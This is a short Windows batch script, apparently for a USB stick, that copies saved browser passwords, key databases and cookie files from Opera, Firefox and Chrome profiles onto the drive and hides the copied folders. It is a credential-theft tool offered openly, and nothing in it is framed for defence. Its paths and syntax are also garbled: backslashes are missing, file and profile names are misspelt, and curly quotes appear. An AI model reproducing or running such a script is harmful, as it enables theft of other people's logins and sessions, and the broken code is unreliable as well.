@echo off
md %~d0Mozilla
md %~d0Opera
md %~d0Google
CD/D %APPDATA%OperaOpera
copy /y wand.dat %~d0Opera
copy /y coockies.dat %~d0Opera
cd %AppData%MozillaFirefoxProfiles*.def-ault
copy /y coockies.sqlite %~d0Mozilla
copy /y key3.db %~d0Mozilla
copy /y signons.sqlite %~d0Mozilla
copy /y AppData%MozillaFirefoxProfiles*.def-ault %~d0Mozilla
cd %localappdata%GoogleChromeUser DataDefault
copy /y “%localappdata%GoogleChromeUser DataDefaultLogin Data” “%~d0/Google”
ATTRIB -R -A -S -H
attrib +h %~d0Mozilla
attrib +h %~d0Opera
attrib +h %~d0Google
del: Autorun.inf
